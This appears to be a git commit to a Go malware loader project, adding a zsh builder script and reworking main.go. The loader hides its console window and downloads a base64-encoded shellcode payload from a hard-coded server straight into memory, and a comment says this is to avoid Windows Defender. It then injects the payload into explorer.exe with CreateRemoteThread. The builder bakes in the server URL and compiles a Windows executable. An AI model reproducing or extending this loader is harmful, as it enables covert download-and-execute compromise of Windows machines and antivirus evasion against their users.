60cfb0ad9efd6b90700b72cae1395fcb737d91ea
fistfulOfHummus <98347396+fistfulofhummus@users.noreply.github.com>
2024-07-16 14:58:01 +0300

    Add files via upload

---
+++ builderNoServer.sh
@@ -0,0 +1,34 @@
+#!/bin/zsh
+
+# Check if exactly 2 args are provided
+if [ "$#" -ne 2 ]; then
+    echo "[i] Usage: $0 <new_url> <file_name>"
+    echo "[i] Subdirs for webserver not supported"
+    echo "[i] e.g: ./builder.sh http://192.168.0.5 main.go"
+    exit 1
+fi
+
+# Not elegant but will do for now
+echo $1 > URL
+base64 URL > base64URL
+base64Address=$(cat base64URL)
+rm URL;rm base64URL
+
+echo "[i] Supplied URL: $1"
+#I can hard code to write to main.go but decided to do this anw
+echo "[i] File to write URL to: $2"
+echo "[i] $base64Address"
+
+# Checks if file exists
+if [ ! -f "$2" ]; then
+    echo "[-]File $file_name not found!"
+    exit 1
+fi
+
+# Replace the line with url with arg1
+sed -i "/url := /c\url := \"$base64Address\"" "$2"
+
+export GOOS=windows
+export GOARCH=amd64
+go build -o $base64Address.exe
+echo "[+] The loader is ready !"
--- main.go
+++ main.go
@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"strings"
+	"syscall"
 
 	"fmt"
 	"io"
@@ -11,12 +12,11 @@ import (
 	"net/http"
 	"os"
 
-	"github.com/D3Ext/maldev/network"
+	"github.com/D3Ext/maldev/process"
 	"github.com/D3Ext/maldev/shellcode"
-	//"crypto"
 )
 
-//var h = HConsole()
+var h = HConsole()
 
 // ALWAYS HAVE STRUCT FIELDS CAPITAL FIRST LETTER. FIX THIS IN YOUR OTHER PROJECT
 type Config struct {
@@ -26,10 +26,10 @@ type Config struct {
 }
 
 func main() {
-	//	HConsole()
+	HConsole()
 	var config Config
 	//url should base64 of http://whatever.blekt or ip
-url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdAo="
+url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvbXlBcGkK"
 	urlBytes, _ := base64.RawStdEncoding.DecodeString(url)
 	url = string(urlBytes)
 	url = strings.Split(url, "\n")[0]
@@ -51,14 +51,26 @@ url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdAo="
 	}
 	fmt.Println(config)
 	fmt.Println("[+]Getting Files From:" + config.DlURL + "/" + config.FileName)
-	network.DownloadFile(config.DlURL + "/" + config.FileName)
-	os.Rename(config.FileName, config.PathNew)
-	fmt.Println("[+]Moving to: " + config.PathNew)
-	contents, _ := os.ReadFile(config.PathNew)
-	os.Remove(config.PathNew)
+	//Touching Disk Defender no likey. FINE.
+	// network.DownloadFile(config.DlURL + "/" + config.FileName)
+	// os.Rename(config.FileName, config.PathNew)
+	// fmt.Println("[+]Moving to: " + config.PathNew)
+	// contents, _ := os.ReadFile(config.PathNew)
+	// os.Remove(config.PathNew)
+	response, err = http.Get(config.DlURL + "/" + config.FileName)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer response.Body.Close()
+	if response.StatusCode != http.StatusOK {
+		log.Fatal(err)
+		os.Exit(1)
+	}
+	contents, _ := io.ReadAll(response.Body)
 	//contentsStr := string(contents)
 	contentsNew := contents
 	base64.RawStdEncoding.Decode(contentsNew, contents)
+	//DLL Injection
 	//os.WriteFile(config.PathNew, contentsNew, 0777)
 	// h, e := syscall.LoadLibrary(config.PathNew) //Make sure this DLL follows Golang machine bit architecture (64-bit in my case)
 	// if e != nil {
@@ -70,21 +82,37 @@ url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdAo="
 	// if e != nil {
 	// 	log.Fatal(e)
 	// }
-
 	//_, _, _ = syscall.Syscall9(uintptr(proc), 0, 2, 2, 2, 2, 0, 0, 0, 0, 0) //Pay attention to the positioning of the parameter
 	//fmt.Printf("Hello dll function returns %d\n", n)
 	// fmt.Println(contentsNew)
-	err = shellcode.Fibers(contentsNew)
+	//Create Remote Thread into werfault.exe process
+	pids, err := process.FindPidByName("explorer.exe")
 	if err != nil {
-		fmt.Println("FATAL ERROR")
-		log.Fatal(err)
+		fmt.Println("[-]FATAL ERROR")
+		os.Exit(1)
 	}
-	//os.WriteFile("testMe2.dll", contentsNew, 0777)
+	if len(pids) > 1 {
+		fmt.Println("[-]The process you want to inject does not exist.")
+		os.Exit(1)
+	}
+	fmt.Print("[+]Injecting into process: ")
+	fmt.Println(pids[0])
+	err = shellcode.CreateRemoteThread(contentsNew, pids[0])
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	//Fibers Method
+	// err = shellcode.Fibers(contentsNew)
+	// if err != nil {
+	// 	fmt.Println("FATAL ERROR")
+	// 	log.Fatal(err)
+	// }
 	fmt.Println("Done!")
 }
 
-//func HConsole() int {
-//	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
-//	FreeConsole.Call()
-//	return 0
-//}
+func HConsole() int {
+	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
+	FreeConsole.Call()
+	return 0
+}
